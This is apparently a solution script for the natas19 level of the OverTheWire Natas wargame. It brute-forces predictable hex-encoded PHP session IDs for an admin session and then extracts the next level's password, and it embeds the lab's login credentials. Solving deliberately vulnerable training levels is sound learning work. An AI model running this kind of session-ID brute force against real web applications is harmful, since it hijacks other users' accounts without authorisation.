import requests
import re



def bin2hex_php(string):
    """
        do the same thing as bin2hex in php
    """
    binary_string = ''.join(format(ord(char), '08b') for char in string)
    return '{:x}'.format(int(binary_string, 2))

URL = 'http://natas19.natas.labs.overthewire.org/index.php?debug=true'
AUTH = ('natas19', '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s')
# HEADERS = {'Authorization': 'Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA=='}
DATA = {
    'username': 'admin',
    'password': 'parham'
}


for i in range(0, 650):
    phpsessid = bin2hex_php(f'{i}-admin')
    cookies = {"PHPSESSID": phpsessid}
    print(' TESTING SESSION phpsessid ', phpsessid,'with id ', i, end='\r')
    response = requests.post(url=URL, data=DATA, auth=AUTH, cookies=cookies)
    if 'You are an admin' in response.text:
        print('FOUND THE ADMIN SESSION ID ->', i)
        print('password', re.findall(r'Password: (.*?)</pre>', response.text))
        break
    if response.status_code != 200:
        print('\r\nERROR', response.status_code, i)
